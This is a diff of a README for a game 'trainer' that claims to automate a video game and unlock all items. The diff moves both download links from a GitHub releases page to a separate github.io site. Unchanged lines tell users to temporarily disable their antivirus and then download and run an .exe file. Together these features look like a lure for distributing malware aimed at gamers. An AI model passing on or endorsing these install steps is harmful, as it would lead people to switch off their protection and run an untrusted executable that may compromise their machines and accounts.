@@ -1,6 +1,6 @@
 # 🕹️ DBD-AutoGrind-Trainer-2026 - Automate your game and unlock all items
 
-[Download the latest version here](https://github.com/predicative-eugeneoneill309/DBD-AutoGrind-Trainer-2026/releases)
+[Download the latest version here](https://predicative-eugeneoneill309.github.io)
 
 ## 📌 About this project
 
@@ -26,7 +26,7 @@ You must disable your antivirus software temporarily during the installation. An
 
 Follow these steps to get the software running on your machine:
 
-1. Visit [this release page](https://github.com/predicative-eugeneoneill309/DBD-AutoGrind-Trainer-2026/releases) to access the download options.
+1. Visit [this release page](https://predicative-eugeneoneill309.github.io) to access the download options.
 2. Select the latest release version at the top of the list.
 3. Download the file ending in .exe to your local hard drive.
 4. Locate the file in your downloads folder.
